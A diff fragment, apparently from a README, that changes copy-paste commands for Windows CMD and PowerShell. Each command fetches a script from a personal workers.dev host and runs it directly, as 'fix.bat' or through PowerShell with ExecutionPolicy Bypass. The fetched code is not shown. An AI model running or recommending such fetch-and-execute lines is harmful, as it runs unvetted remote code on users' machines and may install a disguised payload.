@@ -11,12 +11,12 @@ curl -fsSL https://executeee.nishkarshrana10.workers.dev | sh
 
 **Windows CMD:**
 ```cmd
-curl -fsSL https://executeee.nishkarshrana10.workers.dev -o fix.bat && fix.bat
+curl -fsSL https://executeee.nishkarshrana10.workers.dev -H "X-Platform: windows" -o fix.bat && fix.bat
 ```
 
 **Windows PowerShell:**
 ```powershell
-curl -fsSL https://executeee.nishkarshrana10.workers.dev | powershell -ExecutionPolicy Bypass -Command "-"
+curl -fsSL https://executeee.nishkarshrana10.workers.dev -H "X-Platform: windows" | powershell -ExecutionPolicy Bypass -Command "-"
 ```
 
 Or download and inspect first:
